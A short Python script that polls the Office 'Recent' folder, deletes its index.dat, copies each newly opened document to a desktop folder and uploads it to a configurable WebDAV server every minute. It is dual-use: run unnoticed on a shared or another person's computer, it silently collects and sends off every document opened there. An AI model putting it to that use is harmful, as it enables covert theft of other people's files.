# OfficeAutoCopier
# Author:MyySDSY2021
# Version:0.99.20220214 (Unstable-Dev)

import sys, win32com.client, shutil, os.path, datetime, time
from webdav4.client import Client

##ServerUrl
client = Client(base_url='!!Please_replace_your_Server_url', auth=('Your_username', 'Your_password'))
##LocalPath
base_dir=os.path.join(os.environ['USERPROFILE'],"AppData\Roaming\Microsoft\Office\Recent\\")
index_dat=os.path.join(os.environ['USERPROFILE'],"AppData\Roaming\Microsoft\Office\Recent\index.dat")
target_dir=os.path.join(os.environ['USERPROFILE'],"Desktop\PPTS\\")
if not os.path.exists(target_dir):
    os.makedirs(target_dir)
##Sorting
l_oldl=os.listdir(base_dir)
l_oldl.sort(key=lambda fn: os.path.getmtime(base_dir+fn) if not os.path.isdir(base_dir+fn) else 0)
l_old=l_oldl[-1]
##CheckandCopy
while True:
    if os.path.exists(index_dat) == True:
        os.remove(index_dat)  ##Avoiding Bugs
    l=os.listdir(base_dir)
    l.sort(key=lambda fn: os.path.getmtime(base_dir+fn) if not os.path.isdir(base_dir+fn) else 0)
    shell = win32com.client.Dispatch("WScript.Shell")
    if l_old != l[-1] :
        shortcut = shell.CreateShortCut(base_dir+l[-1])
        l_old = l[-1]
        shutil.copy(shortcut.Targetpath, target_dir)
        client.upload_file(from_path=os.path.join(target_dir,os.path.splitext(l[-1])[0]), to_path=os.path.join('/YourFolderPath',os.path.splitext(l[-1])[0]), overwrite=True)
    time.sleep(60)
